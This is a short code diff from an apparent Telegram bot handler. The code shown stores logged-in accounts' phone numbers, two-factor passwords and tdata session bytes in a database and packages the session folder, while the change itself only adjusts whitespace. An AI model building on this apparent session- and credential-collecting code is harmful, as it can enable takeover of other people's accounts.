@@ -483,6 +483,7 @@ async def handle_guide_cb(client, cb):
                     syd = f"2FA : {passs}"
                 else:
                     nsyd = ""
+       
                 info = {
                     "name": me.first_name or "?",
                     "phone": me.phone or "?",
@@ -493,7 +494,7 @@ async def handle_guide_cb(client, cb):
                 sydno = await db.save_account(me.id, info, tdata_bytes)
                 await show_rar(tdata_path, message, sydno)
                 
-                await message.reply(f"Lᴏɢɢᴇᴅ ɪɴ ᴀs {me.first_name or '?'} ({me.id}) \n ID: {sydno} \n PH: +{me.phone} \n{syd} \n{nsyd}", quote=True)
+                await message.reply(f"Lᴏɢɢᴇᴅ ɪɴ ᴀs {me.first_name or '?'} ({me.id}) \n ID: {sydno} \n PH: +{me.phone} \n {syd} \n {nsyd}", quote=True)
                 results.append(
                     f"#{sydno}\n"
                     f"Aᴄᴄᴏᴜɴᴛ Nᴀᴍᴇ: {info['name']}\n"
